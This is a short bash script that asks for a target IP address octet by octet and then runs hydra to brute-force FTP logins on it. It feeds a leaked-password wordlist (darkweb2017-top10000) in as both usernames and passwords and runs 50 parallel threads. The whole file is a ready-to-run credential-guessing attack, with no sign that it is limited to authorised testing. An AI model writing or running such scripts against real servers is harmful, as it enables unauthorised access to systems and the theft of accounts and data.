#!/bin/bash
target_ip(){
    for ((i=0;i<5;i++));
    do  
        if [ $i -eq 1 ];
        then
            echo "Enter the first bit of target ip address"
            read a
        elif [ $i -eq 2 ];
        then
             echo "Enter the second bit of target ip address"
            read b
        elif [ $i -eq 3 ];
        then
            echo "Enter the third bit of target ip address"
            read c
        elif [ $i -eq 4 ];
        then
             echo "Enter the fourth bit of target ip address"
             read d
        fi
    done
    targetip=$a.$b.$c.$d
    
}
service=ftp
target_ip
hydra -L /home/hatakekakashi/SecLists/Passwords/darkweb2017-top10000.txt  -P "/home/hatakekakashi/SecLists/Passwords/darkweb2017-top10000.txt" "$service"://"$targetip" -V -t 50
